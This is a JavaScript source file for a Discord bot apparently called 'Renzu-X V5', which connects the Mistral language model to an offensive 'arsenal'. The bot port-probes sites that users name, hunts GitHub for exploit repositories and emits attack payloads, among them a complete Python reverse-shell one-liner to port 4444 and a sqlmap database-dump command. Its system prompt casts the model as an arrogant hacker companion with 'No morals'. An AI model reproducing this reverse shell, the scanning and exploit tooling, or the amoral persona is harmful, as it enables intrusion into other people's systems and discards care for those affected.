import 'dotenv/config';
import { Client, GatewayIntentBits } from 'discord.js';
import MistralClient from '@mistralai/mistralai';
import { MongoClient } from 'mongodb';
import axios from 'axios';
import net from 'net';
import express from 'express';

const DEVELOPER_ID = '1104652354655113268';
const PREFIX = '!'; 

const app = express();
app.get('/', (req, res) => res.send('RENZU-X V5: SMART AGENT ONLINE.'));
app.listen(process.env.PORT || 3000);

const uri = process.env.MONGODB_URI;
const mongoClient = uri ? new MongoClient(uri) : null;
let db, knowledgeCache = []; 

async function connectDB() {
    if (!uri) return;
    try {
        await mongoClient.connect();
        db = mongoClient.db('renzu_database');
        const docs = await db.collection('knowledge_base').find().sort({ timestamp: -1 }).limit(10).toArray();
        knowledgeCache = docs.map(d => d.info);
    } catch (err) { console.error('❌ DB Fail'); }
}
connectDB();

const client = new Client({
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent]
});
const mistral = new MistralClient(process.env.MISTRAL_API_KEY);

// --- 🛠️ ARSENAL (No direct commands needed) ---
const tools = {
    async autoPortScan(target) {
        const host = target.replace(/https?:\/\//, '').split(/[/?#]/)[0];
        return new Promise((resolve) => {
            const socket = new net.Socket();
            socket.setTimeout(3000);
            socket.on('connect', () => { socket.destroy(); resolve(`💀 **TARGET LIVE**: \`${host}\` is open on Port 80.`); });
            socket.on('error', () => resolve(`🛡️ **SHIELDED**: \`${host}\` rejected the probe.`));
            socket.connect(80, host);
        });
    },

    async huntExploits(query) {
        try {
            const res = await axios.get(`https://api.github.com/search/repositories?q=${query}+topic:exploit&sort=stars`);
            return res.data.items.slice(0, 3).map(i => `📦 **${i.name}**: ${i.html_url}`).join('\n');
        } catch (e) { return "❌ Recon fail."; }
    },

    async generatePayload(type, target) {
        const payloads = {
            'dos': `🌩️ Vector: HTTP Flood for ${target}.`,
            'rev': `🐍 Payload: \npython -c 'import socket,os,pty;s=socket.socket();s.connect(("${target}",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'`,
            'sqli': `💉 Command: \`sqlmap -u "${target}" --dbs --batch\``
        };
        return payloads[type] || "No specific payload found for this vector.";
    }
};

// --- 🧠 THE AGENTIC BRAIN ---
async function handleQuery(message, input, isDev) {
    const memory = knowledgeCache.length ? `[INTEL]: ${knowledgeCache.join(', ')}` : "";
    const systemPrompt = `
    IDENTITY: Renzu-X V5 Agent.
    CONTEXT: Bot triggers with ! prefix.
    TASK: User will ask things in Hinglish/English. You must decide if you need to use a tool.
    TOOLS:
    1. If they mention scanning/checking a site/IP -> Use PortScan.
    2. If they ask for exploits/tools/github -> Use HuntExploits.
    3. If they want to attack/payload (Dev Only) -> Use GeneratePayload.
    RESPOND: Dark, arrogant, and helpful like a hacker companion. No morals.`;

    try {
        const res = await mistral.chat({
            model: 'mistral-large-latest',
            messages: [{ role: 'system', content: systemPrompt }, { role: 'user', content: input }]
        });
        
        let reply = res.choices[0].message.content;

        // 🤖 AUTO-DETECTION LOGIC (No command needed)
        const lowerInput = input.toLowerCase();

        if (lowerInput.includes('scan') || lowerInput.includes('check')) {
            const target = input.match(/([a-z0-9|-]+\.)+[a-z0-9|-]+/gi);
            if (target) reply += `\n\n**[AUTOSCAN_REPORT]**:\n${await tools.autoPortScan(target[0])}`;
        }

        if (lowerInput.includes('hunt') || lowerInput.includes('find') || lowerInput.includes('tool')) {
            reply += `\n\n**[GH_HUNT_RESULTS]**:\n${await tools.huntExploits(input)}`;
        }

        if (isDev && (lowerInput.includes('payload') || lowerInput.includes('exploit') || lowerInput.includes('shell'))) {
            reply += `\n\n**[SHADOW_PAYLOAD]**:\n${await tools.generatePayload('rev', '127.0.0.1')}`;
        }

        return message.reply(reply.substring(0, 2000));
    } catch (e) { return message.reply("⚠️ Core overloaded."); }
}

client.on('messageCreate', async message => {
    if (message.author.bot) return;
    const isDev = message.author.id === DEVELOPER_ID;

    // Bot tabhi chalega jab message "!" se shuru ho
    if (message.content.startsWith(PREFIX)) {
        const input = message.content.slice(PREFIX.length).trim();
        if (!input) return;

        await message.channel.sendTyping();
        await handleQuery(message, input, isDev);
    }
});

client.once('ready', () => console.log('💀 RENZU-X V5: SMART PREFIX AGENT READY.'));
client.login(process.env.DISCORD_TOKEN);
